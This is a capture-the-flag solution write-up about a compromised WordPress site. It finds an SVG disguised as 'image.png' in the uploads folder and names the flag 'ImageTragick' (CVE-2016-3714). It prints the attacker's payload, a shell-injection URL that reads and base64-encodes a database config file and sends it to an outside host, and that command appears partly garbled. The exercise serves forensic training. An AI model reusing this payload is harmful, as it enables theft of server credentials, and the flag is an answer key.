Solution
========

You get the document root of a hacked Wordpress, which naturally does not includes the webserver logs, meaning you cannot find out if the attack was delivered through the Wordpress login endpoints.
However, there an upload folder at `/wp-content/uploads/` with some user uploaded files. Investigating those files, you find an `image.png` file that contains an SVG with the malicious payload

```
https://pngimage.ack.poc.re/x.php?x=%60for i in $(cat /server/www/conf/db.conf | base64 -w0) ; @- > /dev/null; done

```

This payload reads the `db.conf` and sends it to the attackers site. Executing malicious code inside an SVG is only possible if the SVG parser of this site is vulnerable to CVE-2016-3714, which is also known as `ImageTragick`.


Flag
----

`ImageTragick`
